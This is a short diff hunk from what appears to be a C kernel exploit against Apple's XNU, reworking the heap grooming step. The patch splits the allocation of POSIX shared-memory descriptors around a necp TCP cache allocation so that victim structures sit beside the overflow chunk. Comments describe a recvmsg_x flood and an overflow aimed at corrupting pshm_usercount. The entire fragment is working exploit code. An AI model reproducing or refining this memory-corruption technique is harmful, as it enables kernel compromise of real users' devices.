@@ -599,8 +599,10 @@ int main(int argc, char ** argv)
 	start_recvmsgx_flood(2000);
 
 	//Step 3: Allocate posix shm structures (the victim) and a necp tcp cache structure (the overflow chunk)
+	for(i =  0; i < NUM_SHM_FDS / 2; i++)
+		shm_fds[i] = create_shm_fd(i, 1);
 	set_necp_tcp_cache(16);
-	for(i =  0; i < NUM_SHM_FDS; i++)
+	for(i = NUM_SHM_FDS / 2; i < NUM_SHM_FDS; i++)
 		shm_fds[i] = create_shm_fd(i, 1);
 
 	//Step 4: Do the overflow.  We can't really control the contents afterwards, but all I need to do is get a lowish number put in the pshm_usercount (at offset 4 into the structure).
